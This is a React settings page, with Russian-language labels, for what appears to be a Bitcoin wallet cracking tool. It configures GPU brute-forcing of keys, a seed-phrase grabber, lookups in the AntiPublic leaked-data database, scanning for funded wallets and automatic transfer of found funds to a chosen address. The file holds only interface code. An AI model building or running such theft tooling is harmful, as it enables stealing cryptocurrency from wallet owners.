import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { settingsApi } from '../services/api';
import { Settings } from '../types';
import Tooltip from '../components/Tooltip';
import CustomSelect from '../components/CustomSelect';
import './SettingsPage.css';

const SettingsPage: React.FC = () => {
    const [settings, setSettings] = useState<Settings>({
        bruteLevel: 4,
        strongBrute: true,
        seedGrabber: false,
        scan: true,
        gpuBrute: true,
        bruteTopPercent: 100,
        balanceThreshold: -1,
        scanDepth: 3,
        bruteTopCount: 0,
        antipublicWorking: true
    });
    const [loading, setLoading] = useState(true);
    const [saving, setSaving] = useState(false);

    useEffect(() => {
        loadSettings();
    }, []);

    const loadSettings = async () => {
        try {
            setLoading(true);
            const settingsData = await settingsApi.getSettings();
            setSettings(settingsData);
        } catch (error) {
            console.error('Ошибка загрузки настроек:', error);
        } finally {
            setLoading(false);
        }
    };

    const handleSaveSettings = async () => {
        try {
            setSaving(true);
            await settingsApi.saveSettings(settings);
            alert('Настройки успешно сохранены!');
        } catch (error) {
            console.error('Ошибка сохранения настроек:', error);
            alert('Ошибка при сохранении настроек');
        } finally {
            setSaving(false);
        }
    };

    const handleInputChange = (field: keyof Settings, value: any) => {
        setSettings(prev => ({ ...prev, [field]: value }));
    };

    const handleResetSettings = () => {
        if (window.confirm('Вы уверены, что хотите сбросить все настройки?')) {
            setSettings({
                bruteLevel: 4,
                strongBrute: true,
                seedGrabber: false,
                scan: true,
                gpuBrute: true,
                bruteTopPercent: 100,
                balanceThreshold: -1,
                scanDepth: 3,
                bruteTopCount: 0,
                antipublicWorking: true,
                antipublicKey: '',
                addressToSend: ''
            });
        }
    };

    if (loading) {
        return (
            <div className="page-container">
                <div className="loading">
                    <div className="loading-spinner"></div>
                    <div className="loading-text">Загрузка настроек...</div>
                </div>
            </div>
        );
    }

    const containerVariants = {
        hidden: { opacity: 0 },
        visible: {
            opacity: 1,
            transition: {
                staggerChildren: 0.1
            }
        }
    };

    const itemVariants = {
        hidden: { y: 20, opacity: 0 },
        visible: {
            y: 0,
            opacity: 1,
            transition: {
                duration: 0.5
            }
        }
    };

    return (
        <motion.div
            className="page-container"
            variants={containerVariants}
            initial="hidden"
            animate="visible"
        >
            <motion.div className="settings-header" variants={itemVariants}>
                <h1>Настройки</h1>
                <p>Конфигурация параметров приложения</p>
            </motion.div>

            <motion.div className="settings-grid" variants={itemVariants}>
                <div className="settings-card glass-card">
                    <div className="card-header">
                        <i className="bx bx-cog card-icon"></i>
                        <h3>Основные настройки</h3>
                    </div>

                    <div className="form-group">
                        <div className="form-label-container">
                            <label className="form-label">
                                <i className="bx bx-key"></i>
                                AntiPublic ключ
                            </label>
                            <Tooltip
                                content="Ключ для доступа к базе данных AntiPublic. Используется для проверки скомпрометированных адресов и приватных ключей."
                                position="right"
                            >
                                <i className="bx bx-help-circle tooltip-icon"></i>
                            </Tooltip>
                        </div>
                        <input
                            type="text"
                            className="input form-control"
                            value={settings.antipublicKey || ''}
                            onChange={(e) => handleInputChange('antipublicKey', e.target.value)}
                            placeholder="Введите AntiPublic ключ"
                        />
                    </div>

                    <div className="form-group">
                        <div className="form-label-container">
                            <label className="form-label">
                                <i className="bx bx-wallet"></i>
                                Адрес для отправки
                            </label>
                            <Tooltip
                                content="Bitcoin адрес для автоматической отправки найденных средств. Убедитесь, что адрес корректен."
                                position="right"
                            >
                                <i className="bx bx-help-circle tooltip-icon"></i>
                            </Tooltip>
                        </div>
                        <input
                            type="text"
                            className="input form-control"
                            value={settings.addressToSend || ''}
                            onChange={(e) => handleInputChange('addressToSend', e.target.value)}
                            placeholder="Адрес Bitcoin кошелька"
                        />
                    </div>

                    <div className="form-group">
                        <label className="checkbox-label">
                            <input
                                type="checkbox"
                                className="checkbox-input"
                                checked={settings.scan}
                                onChange={(e) => handleInputChange('scan', e.target.checked)}
                            />
                            <span className="checkbox-custom"></span>
                            <span className="checkbox-text">
                <i className="bx bx-radar"></i>
                Включить сканирование
              </span>
                            <Tooltip
                                content="Активирует автоматическое сканирование блокчейна на наличие активных кошельков с балансом."
                                position="right"
                            >
                                <i className="bx bx-help-circle checkbox-tooltip-icon"></i>
                            </Tooltip>
                        </label>
                    </div>

                    <div className="form-group">
                        <label className="checkbox-label">
                            <input
                                type="checkbox"
                                className="checkbox-input"
                                checked={settings.seedGrabber}
                                onChange={(e) => handleInputChange('seedGrabber', e.target.checked)}
                            />
                            <span className="checkbox-custom"></span>
                            <span className="checkbox-text">
                <i className="bx bx-download"></i>
                Seed граббер
              </span>
                            <Tooltip
                                content="Включает модуль для поиска и сохранения seed-фраз из различных источников и кошельков."
                                position="right"
                            >
                                <i className="bx bx-help-circle checkbox-tooltip-icon"></i>
                            </Tooltip>
                        </label>
                    </div>
                </div>

                <div className="settings-card glass-card">
                    <div className="card-header">
                        <i className="bx bx-chip card-icon"></i>
                        <h3>Настройки брутфорса</h3>
                    </div>

                    <div className="form-group">
                        <div className="form-label-container">
                            <label className="form-label">
                                <i className="bx bx-trending-up"></i>
                                Уровень брутфорса
                            </label>
                            <Tooltip
                                content="Определяет интенсивность перебора ключей. Чем выше уровень, тем больше вычислительных ресурсов используется и тем выше вероятность нахождения пароля"
                                position="right"
                            >
                                <i className="bx bx-help-circle tooltip-icon"></i>
                            </Tooltip>
                        </div>
                        <CustomSelect
                            options={[
                                { value: 1, label: '1 - Базовый' },
                                { value: 2, label: '2 - Легкий' },
                                { value: 3, label: '3 - Средний' },
                                { value: 4, label: '4 - Интенсивный' },
                                { value: 5, label: '5 - Максимальный' }
                            ]}
                            value={settings.bruteLevel}
                            onChange={(value) => handleInputChange('bruteLevel', value)}
                            placeholder="Выберите уровень брутфорса"
                            className="form-control"
                        />
                    </div>

                    <div className="form-group">
                        <div className="form-label-container">
                            <label className="form-label">
                                <i className="bx bx-search-alt-2"></i>
                                Глубина сканирования
                            </label>
                            <Tooltip
                                content="Количество производных адресов для проверки в каждом кошельке. Большая глубина увеличивает шансы найти средства."
                                position="right"
                            >
                                <i className="bx bx-help-circle tooltip-icon"></i>
                            </Tooltip>
                        </div>
                        <input
                            type="number"
                            className="input form-control"
                            value={settings.scanDepth}
                            onChange={(e) => handleInputChange('scanDepth', parseInt(e.target.value))}
                            min="1"
                            max="10"
                        />
                    </div>

                    <div className="form-group">
                        <div className="form-label-container">
                            <label className="form-label">
                                <i className="bx bx-dollar"></i>
                                Порог баланса
                            </label>
                            <Tooltip
                                content="Минимальный баланс для сохранения кошелька. Значение -1 означает сохранение всех найденных кошельков."
                                position="right"
                            >
                                <i className="bx bx-help-circle tooltip-icon"></i>
                            </Tooltip>
                        </div>
                        <input
                            type="number"
                            className="input form-control"
                            value={settings.balanceThreshold}
                            onChange={(e) => handleInputChange('balanceThreshold', parseFloat(e.target.value))}
                            step="0.001"
                            placeholder="-1 для любого баланса"
                        />
                    </div>

                    <div className="form-group">
                        <label className="checkbox-label">
                            <input
                                type="checkbox"
                                className="checkbox-input"
                                checked={settings.gpuBrute}
                                onChange={(e) => handleInputChange('gpuBrute', e.target.checked)}
                            />
                            <span className="checkbox-custom"></span>
                            <span className="checkbox-text">
                <i className="bx bx-chip"></i>
                GPU брутфорс
              </span>
                            <Tooltip
                                content="Использует видеокарту для ускорения процесса перебора ключей. Значительно увеличивает производительность."
                                position="right"
                            >
                                <i className="bx bx-help-circle checkbox-tooltip-icon"></i>
                            </Tooltip>
                        </label>
                    </div>

                    <div className="form-group">
                        <label className="checkbox-label">
                            <input
                                type="checkbox"
                                className="checkbox-input"
                                checked={settings.strongBrute}
                                onChange={(e) => handleInputChange('strongBrute', e.target.checked)}
                            />
                            <span className="checkbox-custom"></span>
                            <span className="checkbox-text">
                <i className="bx bx-shield"></i>
                Усиленный брутфорс
              </span>
                            <Tooltip
                                content="Активирует дополнительные алгоритмы перебора и оптимизации для повышения эффективности поиска."
                                position="right"
                            >
                                <i className="bx bx-help-circle checkbox-tooltip-icon"></i>
                            </Tooltip>
                        </label>
                    </div>
                </div>
            </motion.div>

            <motion.div className="settings-actions" variants={itemVariants}>
                <motion.button
                    className="btn btn-success"
                    onClick={handleSaveSettings}
                    disabled={saving}
                    whileHover={{ scale: 1.05 }}
                    whileTap={{ scale: 0.95 }}
                >
                    <i className="bx bx-save"></i>
                    {saving ? 'Сохранение...' : 'Сохранить настройки'}
                </motion.button>

                <motion.button
                    className="btn btn-reset"
                    onClick={handleResetSettings}
                    whileHover={{ scale: 1.05 }}
                    whileTap={{ scale: 0.95 }}
                >
                    <i className="bx bx-reset"></i>
                    Сбросить все настройки
                </motion.button>
            </motion.div>
        </motion.div>
    );
};

export default SettingsPage;